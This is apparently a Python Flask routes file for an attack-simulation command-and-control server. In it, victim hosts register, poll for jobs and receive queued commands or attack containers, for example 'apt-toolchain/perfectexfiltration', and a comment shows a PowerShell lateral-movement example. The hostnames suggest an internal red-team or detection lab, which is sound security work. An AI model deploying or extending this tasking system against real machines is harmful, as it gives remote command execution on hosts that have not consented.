from flask import json, jsonify, request
from . import routes, __create_response__
from redis_db import victims, attacks
from config import config
import uuid
import os
import requests


# starting a attack
# Request-URL: /register?victim=IM-SEC-001
@routes.route('register', methods=['POST'])
def register_victim():
    victim = request.args.get('victim')
    if victim is not None:
        print('Registering the victim {}'.format(victim))
        victims.set.register_victim_by_hostname(victim)
    return __create_response__(200)


# show all victims
# Request-URL: /victims
@routes.route('victims', methods=['GET'])
def list_victims():
    victim_list = victims.get.list_victims()
    return __create_response__(200, data={'victims': victim_list})


# this receives a post request which adds a new
# attack to the listing of available attacks
# Request-Body:
# {
#   data: [{
#       name: "perfectexfiltration",
#       command: "docker run perfectexfiltration",
#       execType: docker
#   },{
#       name: "lateralmovement",
#       command: "Invoke-Command -ComputerName IM-SEC-001 -ScriptBlock {echo "hello world"}",
#       execType: powershell
#   },...]
# }
#@routes.route('attack/new', methods=['POST'])
#def add_new_attack():
#    req = request.get_data(as_text=True)
#    data = json.loads(str(req))
#    attacks.set.save_multiple_attacks(data['data'])
#    return jsonify({'status': 200, 'msg': 'saved the given attacks'})


# starting a attack
# Request-Body:
# {
#   attack: "apt-toolchain/perfectexfiltration"
#   victims: ['IM-SEC-001', 'IM-SEC-002']
# }
@routes.route('attack', methods=['POST'])
def run_attack():
    req = request.get_data(as_text=True)
    data = json.loads(str(req))

    # now get the attack name
    attack = data['attack']
    victim_list = data['victims']

    # get the native attacks
    if attacks.is_native_attack(attack):

        # get the command first
        command = attacks.get_native_attack_command(attack)

        # add a job for each victim
        for victim in victim_list:
            print('The user requests the attack {} for victim'.format(attack, victim))
            attacks.add_job(victim, "{}".format(command))

    else:
        # first of all get the config of the hostname
        # if a environ-variable is set, use that one! --> probably used within docker-compose
        docker_host = config['docker']['registry']['url']
        if os.environ['REGISTRY_URL'] is not None:
            docker_host = os.environ['REGISTRY_URL']

        # add additional options for running a container in general
        add_options = ""
        if os.environ["SYSLOG_RECEIVER"] is not None:
            add_options += " --log-driver syslog --log-opt syslog-address=tcp://{}".format(os.environ["SYSLOG_RECEIVER"])

        # store the commands for the victims
        for victim in victim_list:
            print('The user requests the attack {} for victim'.format(attack, victim))

            # add additional host specific options
            add_options += " -e HOSTNAME={}".format(victim)

            # now create the attack command
            attack_cmd = 'docker run -d {} {}:5000/{}'.format(add_options, docker_host, attack)

            attacks.add_job(victim, "{}".format(attack_cmd))

    # finished the attack creation request
    return __create_response__(200)


# Request-URL: /attack?victim=IM-SEC-001
@routes.route('attack', methods=['GET'])
def list_jobs():
    # get the victims hostname
    victim = request.args.get('victim')

    # remember, that the victim requested a job -> he's active!!
    victims.set.update_victim_ttl(victim)

    # get the job and return it
    job = attacks.get_job(victim)
    if job is None:
        job = ""

    # create a unique identifier
    job_uuid = uuid.uuid4()

    # print('Victim {} requested a new job: {}'.format(victim, job))
    return __create_response__(200, data={
        'job': job,
        'uuid': job_uuid
    })

@routes.route('attack/add', methods=['POST'])
def add_new_attach():
    # get the attack data
    req = request.get_data(as_text=True)
    data = json.loads(str(req))

    # now save the attacks into redis
    attacks.add_native_attack(data)

    return __create_response__(200, 'added the new attack')


# returns the list of available attacks
@routes.route('list', methods=['GET'])
def list_attacks():

    # first of all get the config of the hostname
    # if a environ-variable is set, use that one! --> probably used within docker-compose
    docker_host = config['docker']['registry']['url']
    if os.environ['REGISTRY_URL'] is not None:
        docker_host = os.environ['REGISTRY_URL']

    # build the registry-url
    registry_url = docker_host
    registry_port = config['docker']['registry']['port']
    registry = "http://{}:{}/v2/_catalog".format(registry_url, registry_port)

    # we don't need to verify the registry, it should be ours! just request the repositories
    response = requests.get("{}".format(registry), verify=False)
    docker_attacks = response.json()
    docker_attacks = docker_attacks['repositories']

    # now get the redis-saved native attacks
    native_attacks = attacks.get_native_attacks()

    # now create a big list of attacks
    response_data = [*docker_attacks, *native_attacks]
    #response_data.append({'docker': docker_attacks})
    #response_data.append({'native': native_attacks})

    return __create_response__(200, data=response_data)
